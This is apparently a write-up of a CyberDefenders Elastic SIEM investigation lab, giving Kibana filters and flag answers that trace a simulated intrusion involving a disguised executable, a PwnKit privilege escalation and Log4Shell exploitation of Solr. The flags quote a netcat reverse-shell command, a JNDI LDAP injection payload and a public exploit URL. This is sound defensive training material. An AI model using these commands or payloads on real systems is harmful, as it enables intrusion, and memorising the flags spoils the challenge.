# Elastic SIEM
This challenge uses Elastic as an SIEM tool to investigate malicious activities. 

## 1. Who downloads the malicious file which has a double extension?

Filter: `file.name: *.*.exe`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/c5ca1888-58cc-4146-86be-dc9b7975b5cc)

**Flag 1: ahmed**

## 2. What is the hostname he was using?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/a0834ef9-f7d8-4bd6-babf-43f50ec20eec)

**Flag 2: DESKTOP-Q1SL9P2**

## 3. What is the name of the malicious file?

**Flag 3: Acount_details.pdf.exe**

## 4. What is the attacker's ip address?

Go to Security > Alerts

Filter: `file.name:Acount_details.pdf.exe`

![6](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/7d9fb1ed-d9a7-46e7-b562-0f621c3563ec)

**Flag 4: 192.168.1.10**

## 5. Another user with high privilege runs the same malicious file. What is the username?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/d725b618-b709-47bf-b285-45c49d3c25c0)

**Flag 5: cybery**

## 6. The attacker was able to upload a DLL file of size 8704. What is the file name?

Filter: `file.size: 8704 and file.name:*.dll`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/ded7a66f-86f4-435a-87bd-805c8a971d46)

**Flag 6: mCblHDgWP.dll**

## 7. What parent process name spawns cmd with NT AUTHORITY privilege and pid 10716?

Filter: `process.pid: 10716 and user.domain:NT AUTHORITY and process.name:"cmd.exe"`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/f13e8033-fea4-4522-9979-04510d9c4992)

**Flag 7: rundll32.exe**

## 8. The previous process was able to access a registry. What is the full path of the registry?

Filter: `process.name:"rundll32.exe"`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/618437d3-eaf1-4630-9e51-c4687174cfe7)

**Flag 8: HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled**

## 9. PowerShell process with pid 8836 changed a file in the system. What was that filename?

Filter: `process.name:"powershell.exe" and process.pid:8836 and event.action:"overwrite"`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/26aeb9b3-ff79-4bad-b4eb-2a0aa76bad5b)

**Flag 9: ModuleAnalysisCache**

## 10. PowerShell process with pid 11676 created files with the ps1 extension. What is the first file that has been created?

Filter: `file.name:*.ps1 and process.pid:11676 and event.action:"creation"`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/69cc23c2-471b-4906-8abf-8e20da8548ee)

**Flag 10: __PSScriptPolicyTest_bymwxuft.3b5.ps1**

## 11. What is the machine's IP address that is in the same LAN as a windows machine?

Explore hosts

![10 1](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/e61074bc-e9e6-4557-bf7f-1f9d55139bd8)
![10 2](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/1a2112cf-72b9-476e-95a8-bd7d8ad2557d)

**Flag 11: 192.168.10.30 (ubuntu)**

## 12. The attacker login to the Ubuntu machine after a brute force attack. What is the username he was successfully login with?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/0876112b-8e91-46d1-b442-c23c3898be8b)

**Flag 12: Salem**

## 13. After that attacker downloaded the exploit from the GitHub repo using wget. What is the full URL of the repo?

Filter.name: `process.args:"wget" and user.name:"salem"`

![13](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/c7999e9a-902d-485b-87a2-16e1fb11dcec)

**Flag 13: https://raw.githubusercontent[.]com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py**

## 14. After The attacker runs the exploit, which spawns a new process called pkexec, what is the process's md5 hash?

Filter: `process.name:"pkexec"`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/89c2da2f-17fb-42a3-82d3-3bda34e3c63a)

**Flag 14: 3a4ad518e9e404a6bad3d39dfebaf2f6**

## 15. Then attacker gets an interactive shell by running a specific command on the process id 3011 with the root user. What is the command?

Filter: `user.name:"root" and process.pid:3011`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/984ad4df-9929-4d95-b3c3-7b416afa8f95)

**Flag 15: bash -i**


## 16. What is the hostname which alert signal.rule.name: "Netcat Network Activity"?

For Q16-Q19: Go to Security > Alerts --> Filter: `signal.rule.name: "Netcat Network Activity"`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/e56556c4-7531-4080-8df8-38cb4dd04968)

**Flag 16: CentOS**

## 17. What is the username who ran netcat?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/fa1bd7d2-f7f2-4356-be80-75d9ebfc7aed)

**Flag 17: solr**

## 18. What is the parent process name of netcat?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/e93e9ee1-dc84-4e13-a28c-66768c425b0f)

**Flag 18: java**

## 19. If you focus on nc process, you can get the entire command that the attacker ran to get a reverse shell. Write the full command?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/625aacbd-bcaa-4a82-8d4d-4922a9be2a42)

**Flag 19: nc -e /bin/bash 192.168.1.10 9999**

## 20. From the previous three questions, you may remember a famous java vulnerability. What is it?

**Flag 20: Log4Shell**

## 21. What is the entire log file path of the "solr" application?

Filter: `solr and file.path:*.log`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/5b77c6aa-c325-46d4-9a4a-6e22e9598e17)

**Flag 21: /var/solr/logs/solr.log**

## 22. What is the path that is vulnerable to log4j?

For Q22 & Q23: Filter: `log.file.path:*solr*`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/9c8401ef-2409-4a2a-954a-8f107ab3ddef)

**Flag 22: /admin/cores**

## 23. What is the GET request parameter used to deliver log4j payload?

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/de78bb48-6ecb-4b5f-9a8c-7d0ac82f18da)

**Flag 23: foo**

## 24. What is the JNDI payload that is connected to the LDAP port?

Filter: `log.file.path : *solr* and message:*ldap*`

![image](https://github.com/LegendofLightning/CyberDefenders/assets/66300601/6a6ccab3-3c8f-4eb2-bafa-e48ba7b4a23f)

**Flag 24: {foo=${jndi:ldap://192.168.1.10:1389/Exploit}}**











































